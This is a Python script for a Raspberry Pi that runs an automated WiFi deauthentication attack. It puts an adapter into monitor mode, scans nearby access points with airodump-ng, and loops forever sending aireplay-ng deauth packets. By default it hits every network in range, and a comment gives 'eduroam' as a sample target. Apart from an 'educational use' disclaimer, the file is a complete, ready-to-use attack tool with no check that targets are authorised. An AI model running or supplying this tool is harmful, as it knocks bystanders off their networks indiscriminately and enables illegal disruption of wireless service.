"""
WiFi Deauthentication Attack Script for Raspberry Pi Wardrive

This script performs automated WiFi deauthentication attacks on nearby networks.
It continuously scans for WiFi access points using airodump-ng, identifies the
strongest signal, and sends deauth packets to disrupt connections.

The script is designed to run on a Raspberry Pi with a WiFi adapter capable of
monitor mode (e.g., Alfa series). It's intended for educational and authorized
testing purposes only.

Main workflow:
1. Enable monitor mode on the wireless interface
2. Scan for nearby access points (airodump-ng)
3. Parse CSV data to identify target networks
4. Sort by signal strength and select the strongest AP
5. Send deauthentication packets to the target
6. Repeat indefinitely

Author: Security Research
License: Educational Use Only
"""

import subprocess
import csv
import datetime
import os
import time
import re
import pwd
#import pprint
import _thread

# Import LCD display module for status updates
try:
    from lcd_display import init_lcd, printLCD, display_status, clearLCD, stopMarquee
    LCD_AVAILABLE = True
except ImportError:
    print("WARNING: LCD module not available. Continuing without LCD display.")
    LCD_AVAILABLE = False

# Global variable to track the current WiFi channel we're operating on
# This minimizes channel hopping for better performance
current_channel = -1

def hop_channel(interface, channel):
	"""
	Change the wireless interface to operate on a specific WiFi channel.
	
	Args:
		interface (str): The wireless interface name (e.g., 'wlan1')
		channel (int): The WiFi channel number to switch to (1-14 for 2.4GHz)
	
	Returns:
		None: Updates the global current_channel variable
	"""
	global current_channel
	# Use iwconfig to change the channel on the wireless interface
	process = subprocess.Popen(["sudo", "iwconfig", interface, "channel", str(channel)], stdout=subprocess.PIPE, stderr = subprocess.PIPE)
	stdout, stderr = process.communicate()
	current_channel = channel
	print("Hopped to channel", channel)


def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
	"""
	Send deauthentication packets to a specific access point.
	
	This function uses aireplay-ng to send deauth packets which will disconnect
	clients from the target access point. It automatically switches to the correct
	channel before attacking.
	
	Args:
		interface (str): The wireless interface in monitor mode
		num_pkts_to_send (int): Number of deauth packets to send
		ap_mac (str): MAC address (BSSID) of the target access point
		ap_channel (int): WiFi channel the AP is operating on
		ap_essid (str): Network name (ESSID) of the target AP
	
	Returns:
		None: Prints timing information about the attack duration
	"""
	global current_channel
	try:
		print("Deauthing", ap_essid, "(", ap_mac, ") on channel", ap_channel, "num of packets: ", num_pkts_to_send, "...")
		
		# Only hop channels if we're not already on the target channel
		# This optimization reduces latency and improves attack efficiency
		if(current_channel != ap_channel):
			hop_channel(interface, ap_channel)
		
		# Record start time for performance measurement
		date = datetime.datetime.now()
		
		# Execute aireplay-ng deauth attack
		# -0 specifies deauth attack, -a specifies the AP MAC address
		process = subprocess.Popen(['sudo', 'aireplay-ng', "-0", str(num_pkts_to_send), "-a", ap_mac, interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		stdout, stderr = process.communicate()
		
		# Calculate and display how long the attack took
		date2 = datetime.datetime.now()
		print("Delta time =",date2-date)

	except KeyboardInterrupt:
		print("Stopping")
		exit(0)

def read_csv(directory, file_name):
	"""
	Parse airodump-ng CSV file to extract access point information.
	
	The airodump-ng CSV format contains two sections:
	1. Access point (AP) data - networks detected
	2. Client data - devices connected to networks
	
	This function only parses the AP section and filters out invalid entries.
	
	Args:
		directory (str): Directory path where the CSV file is located
		file_name (str): Name of the CSV file to parse
	
	Returns:
		tuple: (bssids, channels, essids, powers) - Lists of AP information
		None: If parsing fails or no valid data found
	"""
	bssids = []    # MAC addresses of access points
	channels = []  # WiFi channels (1-14 for 2.4GHz, higher for 5GHz)
	essids = []    # Network names (SSIDs)
	powers = []    # Signal strength in dBm
	
	with open(os.path.join(directory, file_name)) as csv_file:
		reader = csv.reader(csv_file)
		next(reader) # Skip first empty line in airodump CSV format
		next(reader) # Skip column header line
		
		for row in reader:
			if(row):
				# Check if signal power is valid (not -1)
				# Power of -1 indicates the AP is out of range or signal too weak
				if(int(row[8].strip()) == -1):
					print("Power is -1, continuing")
					continue
				
				# Extract AP data from CSV columns
				bssids.append(row[0])                  # Column 0: BSSID (MAC address)
				channels.append(int(row[3].strip()))   # Column 3: Channel number
				essids.append(row[13])                 # Column 13: ESSID (network name)
				powers.append(row[8])                  # Column 8: Power level (dBm)
			else:
				# Empty row marks the end of AP section and start of client section
				# We only care about APs, so break here
				break
	
	# Validate that we successfully parsed data
	if(bssids and channels and essids and powers):
		return bssids, channels, essids, powers
	else:
		# Debug output if parsing failed
		print("Invalid return type")
		print("bssids")
		print(bssids)
		print("channels")
		print(channels)
		print("essids")
		print(essids)
		print("powers")
		print(powers)
		return None

def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_essid=None, attack_all=False):
	"""
	Read CSV file and execute deauth attack on target access point(s).
	
	This function parses the airodump CSV, filters valid targets, and executes
	the deauth attack. Can target a specific ESSID or all networks.
	
	Args:
		file_dir (str): Directory containing the CSV file
		file_name (str): Name of the CSV file to parse
		interface (str): Wireless interface in monitor mode
		num_pkts_to_send (int): Number of deauth packets to send per attack
		target_essid (str): Specific network name to target (e.g., "eduroam")
		                    If None, targets all networks
		attack_all (bool): If True, attack all found APs; if False, only strongest
	
	Returns:
		None: Executes the attack and prints status information
	"""
	# Parse the CSV file to get AP information
	ret = read_csv(file_dir, file_name)
	if(not ret):
		if LCD_AVAILABLE:
			display_status("Error", "No AP data")
		return
	
	bssids, channels, essids, powers = ret
	
	# Sanity check: all lists should have the same length
	if(len(bssids) != len(channels) != len(essids) != len(powers)):
		print("Length of bssids/channels/essids missmatch")
		exit(1)

	# Build a list of valid targets, filtering out invalid entries
	my_list = []
	for (bssid, channel, essid, power) in zip(bssids, channels, essids, powers):
		# Skip invalid channels (<=0) and invalid power levels (>=-1)
		# Valid power is negative dBm (e.g., -30, -50, -70)
		if(int(channel) <= 0 or int(power) >= -1):
			continue
		
		# If target_essid is specified, only include matching networks
		if target_essid is not None:
			if essid.strip().lower() == target_essid.lower():
				my_list.append([bssid, channel, essid, power])
				print(f"Found target network: {essid} ({bssid}) on channel {channel}, power {power}")
		else:
			my_list.append([bssid, channel, essid, power])

	# Check if we found any valid targets
	if not my_list:
		if target_essid:
			print(f"WARNING: Target network '{target_essid}' not found!")
			if LCD_AVAILABLE:
				display_status("Not Found", f"{target_essid}")
		else:
			print("WARNING: No valid APs detected")
			if LCD_AVAILABLE:
				display_status("No APs", "Detected")
		return

	if attack_all:
		# Attack all detected APs in sequence
		print(f"Attacking {len(my_list)} access point(s)...")
		
		# Sort by signal strength (strongest first)
		my_list.sort(key=lambda x: x[3])
		
		# Attack each AP in the list
		for idx, lst in enumerate(my_list, 1):
			print(f"[{idx}/{len(my_list)}] Attacking {lst[2]} ({lst[0]})")
			if LCD_AVAILABLE:
				display_status(f"AP {idx}/{len(my_list)}", lst[2][:16])
			deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])
	else:
		# Attack only the strongest AP
		# Sort by power (index 3) - strongest signal has highest value (least negative)
		my_list.sort(key=lambda x: x[3])
		lst = my_list[0]
		
		print(f"Attacking strongest: {lst[2]} ({lst[0]}) power: {lst[3]}")
		
		# Display target on LCD
		if LCD_AVAILABLE:
			display_status("Attacking", lst[2][:16])
		
		deauth(interface, num_pkts_to_send, lst[0], lst[1], lst[2])


def airodump(interface, dump_dir, dump_prefix):
	"""
	Start airodump-ng to scan for nearby WiFi access points.
	
	Airodump-ng captures WiFi packets and logs information about nearby APs
	to a CSV file. This runs as a background process that continuously scans
	all channels and updates the CSV file.
	
	Args:
		interface (str): Wireless interface in monitor mode
		dump_dir (str): Directory to save the CSV output files
		dump_prefix (str): Prefix for the output filenames (e.g., "dump")
	
	Returns:
		None: Starts the process in the background
	"""
	# Build the full output path
	output_path = os.path.join(dump_dir, dump_prefix)
	
	# Don't use sudo if we're already root
	cmd = ["airodump-ng", interface, "-w", output_path, "--output-format", "csv"]
	
	# Start airodump-ng
	proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	print("airodump-ng process started")

def killall_airodump():
	"""
	Terminate all running airodump-ng processes.
	
	This is necessary after each scan cycle to stop the continuous scanning
	so we can read the CSV files and perform the deauth attack.
	
	Returns:
		None: Waits for the killall command to complete
	"""
	print("Killing airodump-ng processes")
	FNULL = open("/dev/null", "w")
	p = subprocess.Popen(["sudo", "killall", "airodump-ng"], stdout=FNULL, stderr=FNULL)
	p.communicate()

def rm_csv(dump_dir):
	"""
	Remove old CSV dump files from the dump directory.
	
	This cleans up old scan data at the start of the script to ensure we're
	working with fresh data. Note: This only removes CSV files, preserving
	other capture files if present.
	
	Args:
		dump_dir (str): Directory containing the CSV files to remove
	
	Returns:
		None
	"""
	print("Removing dump files")
	# Use shell=True with wildcards to remove all CSV files
	subprocess.call('rm -rf '+dump_dir+"/*.csv", shell=True)

def get_latest_csv(directory, dump_prefix):
	"""
	Find the most recently created CSV dump file in the directory.
	
	Airodump-ng creates files with incrementing numbers (dump-01.csv, dump-02.csv).
	This function identifies which file was created most recently based on file
	creation time, ensuring we read the latest scan data.
	
	Args:
		directory (str): Directory to search for CSV files
		dump_prefix (str): Prefix of the dump files (e.g., "dump")
	
	Returns:
		str: Filename of the most recent CSV file
		None: If no valid CSV files found
	"""
	# Get all files in the directory
	onlyfiles = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
	
	# Regex pattern to match airodump-ng CSV files (e.g., dump-01.csv)
	pattern = "dump-(\d*)\.csv"
	dump_files = {}
	
	# Build a dictionary of dump files with their creation times
	for f in onlyfiles:
		x = re.search(pattern, f)
		if(x):
			creation_time = time.ctime(os.path.getctime(os.path.join(directory, f)))
			dump_files[f] = creation_time

	# Sort files by creation time (newest first)
	dump_files2 = {}
	for k in sorted(dump_files, key=dump_files.get, reverse=True):
		dump_files2[k] = dump_files[k]

	# Return the most recent file, or None if no files found
	if(len(dump_files2) > 0):
		return list(dump_files2.keys())[0]
	else:
		return None

def airmon_start(interface):
	"""
	Enable monitor mode on the wireless interface using airmon-ng.
	
	Monitor mode allows the WiFi adapter to capture all wireless traffic,
	not just packets destined for it. This is required for packet injection
	and deauth attacks.
	
	Args:
		interface (str): The wireless interface to put in monitor mode (e.g., 'wlan1')
	
	Returns:
		None: Waits for airmon-ng to complete
	"""
	FNULL = open("/dev/null", "w")
	
	# Terminate any existing wpa_supplicant processes on this interface
	# wpa_supplicant manages normal WiFi connections and conflicts with monitor mode
	subprocess.Popen(["sudo", "wpa_cli", "-i", interface, "terminate"], stdout=FNULL, stderr=FNULL) 
	
	# Start monitor mode using airmon-ng
	p = subprocess.Popen(["sudo", "airmon-ng", "start", interface], stderr=FNULL, stdout=FNULL)
	p.communicate()
	print("Monitor mode enabled")	


# ============================================================================
# MAIN PROGRAM
# ============================================================================

# Security check: ensure script is run with root privileges
# Root is required for monitor mode, packet injection, and system commands
if(os.geteuid() != 0):
	print("Run as root")
	exit(1)

# ============================================================================
# Configuration Variables
# ============================================================================
dump_prefix = "dump"              # Prefix for airodump-ng output files

# Detect actual user home directory (handles sudo correctly)
if 'SUDO_USER' in os.environ:
    actual_user = os.environ['SUDO_USER']
    dump_dir = pwd.getpwnam(actual_user).pw_dir + "/dump"
else:
    dump_dir = os.path.expanduser("~/dump")

deauth_num_pkts = 100             # Number of deauth packets to send per attack
iface = "wlan1"                   # Wireless interface in monitor mode (usually external adapter)
deauth_max_seconds = 30           # Time between scans (unused in current implementation)
                                   # Note: Could be used to refresh targets periodically

# Target Configuration
# Set to a specific network name (e.g., "eduroam") to target only that network
# Set to None to target all networks
target_essid = None               # None = attack all networks found
                                   # Or set to "eduroam" for specific network

# Attack Mode
# Set to True to attack all found networks/APs in sequence
# Set to False to attack only the strongest signal
attack_all_found = True           # True = attack all, False = strongest only

# ============================================================================
# Initialization
# ============================================================================

# Initialize LCD display if available
if LCD_AVAILABLE:
    print("Initializing LCD display...")
    if init_lcd(i2c_bus=1, i2c_address=0x27, cols=16, rows=2):
        print("LCD initialized successfully")
        display_status("WiFi Deauth", "Initializing...")
    else:
        print("LCD initialization failed, continuing without display")
        LCD_AVAILABLE = False

# Enable monitor mode on the wireless interface
# NOTE: Consider running this once in startup script instead of every time
if LCD_AVAILABLE:
    display_status("Starting", "Monitor Mode...")
    
airmon_start(iface)

# Detect the actual monitor mode interface (might be wlan1mon instead of wlan1)
print("Detecting monitor mode interface...")
result = subprocess.run(["iwconfig"], capture_output=True, text=True)

# Check if original interface is in monitor mode
if "Mode:Monitor" in result.stdout:
    # Find which interface has monitor mode
    for line in result.stdout.split('\n'):
        if "Mode:Monitor" in line:
            # Extract interface name (first word on the line)
            monitor_iface = line.split()[0]
            if monitor_iface != iface:
                print(f"Monitor interface is: {monitor_iface} (not {iface})")
                iface = monitor_iface
            else:
                print(f"Monitor mode confirmed on: {iface}")
            break
else:
    print("ERROR: No interface in monitor mode found!")
    print("Available interfaces:")
    print(result.stdout)
    print("\nTry manually:")
    print(f"  sudo airmon-ng start wlan1")
    print(f"  iwconfig")
    exit(1)

if LCD_AVAILABLE:
    display_status("Cleaning", "Old Files...")

# Ensure dump directory exists
if not os.path.exists(dump_dir):
    print(f"Creating dump directory: {dump_dir}")
    os.makedirs(dump_dir, exist_ok=True)
else:
    print(f"Using dump directory: {dump_dir}")

# Clean up any old CSV files from previous runs
rm_csv(dump_dir)

if LCD_AVAILABLE:
    if target_essid:
        if attack_all_found:
            display_status("Target: All", target_essid[:16])
        else:
            display_status("Target: 1", target_essid[:16])
    else:
        if attack_all_found:
            display_status("Attack Mode", "All Networks")
        else:
            display_status("Attack Mode", "Strongest AP")
    time.sleep(2)

# Print configuration summary
print("\n" + "="*50)
print("ATTACK CONFIGURATION")
print("="*50)
if target_essid:
    print(f"Target Network: {target_essid}")
else:
    print("Target Network: All networks")
if attack_all_found:
    print("Attack Mode: ALL access points found")
else:
    print("Attack Mode: Strongest signal only")
print(f"Packets per AP: {deauth_num_pkts}")
print("="*50 + "\n")

# Test airodump-ng before starting main loop
print("\nTesting airodump-ng...")
test_output = os.path.join(dump_dir, "test")
test_cmd = ["airodump-ng", iface, "-w", test_output, "--output-format", "csv"]
print(f"Test command: {' '.join(test_cmd)}")

test_proc = subprocess.Popen(test_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
time.sleep(3)
test_proc.terminate()
time.sleep(1)

# Check if test file was created
test_files = [f for f in os.listdir(dump_dir) if f.startswith("test")]
if test_files:
    print(f"SUCCESS: airodump-ng created: {test_files}")
    # Clean up test files
    for f in test_files:
        os.remove(os.path.join(dump_dir, f))
else:
    print("ERROR: airodump-ng did not create any files!")
    print("Checking for errors...")
    _, stderr = test_proc.communicate()
    if stderr:
        print(f"airodump-ng error: {stderr.decode()}")
    print("\nThis might be because:")
    print("  1. Interface is not in monitor mode")
    print("  2. You don't have permission to write to dump directory")
    print("  3. airodump-ng is not installed correctly")
    exit(1)

# ============================================================================
# Main Attack Loop
# ============================================================================
# This loop runs indefinitely until interrupted by the user (Ctrl+C)
# Each iteration: scan -> parse -> attack -> repeat
loop_count = 0
while True:
	try:
		loop_count += 1
		print(f"\n=== Attack Loop {loop_count} ===")
		
		# Step 1: Start airodump-ng to scan for nearby access points
		if LCD_AVAILABLE:
			display_status("Scanning", "WiFi Networks...")
		print("Starting airodump-ng scan...")
		airodump(iface, dump_dir, dump_prefix)
		
		# Step 2: Wait for airodump to collect enough data
		# 10 seconds allows it to scan multiple channels and detect APs
		if LCD_AVAILABLE:
			display_status("Scanning", "10 seconds...")
		time.sleep(10)
		
		# Step 3: Stop airodump so we can read the CSV file
		if LCD_AVAILABLE:
			display_status("Stopping", "Scanner...")
		killall_airodump()
		
		# Step 4: Find the most recent CSV file created by airodump
		if LCD_AVAILABLE:
			display_status("Reading", "Scan Data...")
		
		latest_dump_csv_file_name = get_latest_csv(dump_dir, dump_prefix)
		print("Latest dump:", latest_dump_csv_file_name)

		# Validate that we found a CSV file
		if(not latest_dump_csv_file_name):
			print("WARNING: No CSV file found, retrying...")
			if LCD_AVAILABLE:
				display_status("Error", "No CSV File")
			time.sleep(3)
			continue

		# Step 5: Execute deauth attack on the target AP(s)
		# This reads the CSV, selects target(s), and sends deauth packets
		if LCD_AVAILABLE:
			if target_essid:
				display_status("Searching", target_essid[:16])
			else:
				display_status("Analyzing", "Networks...")
		
		date_start = datetime.datetime.now()
		deauth_from_csv(dump_dir, latest_dump_csv_file_name, iface, deauth_num_pkts, target_essid, attack_all_found)
		
		if LCD_AVAILABLE:
			display_status("Loop Complete", f"#{loop_count}")
		print(f"Loop {loop_count} complete")
		
		# Brief pause before next scan cycle
		time.sleep(2)

	except KeyboardInterrupt:
		# Handle Ctrl+C gracefully
		print("\n\nStopping attack...")
		killall_airodump()
		if LCD_AVAILABLE:
			stopMarquee()
			display_status("Stopped", "User Exit")
			time.sleep(2)
			clearLCD()
		print("Stopped by user")
		exit(0)
	except Exception as e:
		# Catch any other errors and display them
		print(f"ERROR in main loop: {e}")
		if LCD_AVAILABLE:
			display_status("Error", str(e)[:16])
		time.sleep(5)  # Wait before retrying

print("Script finished")

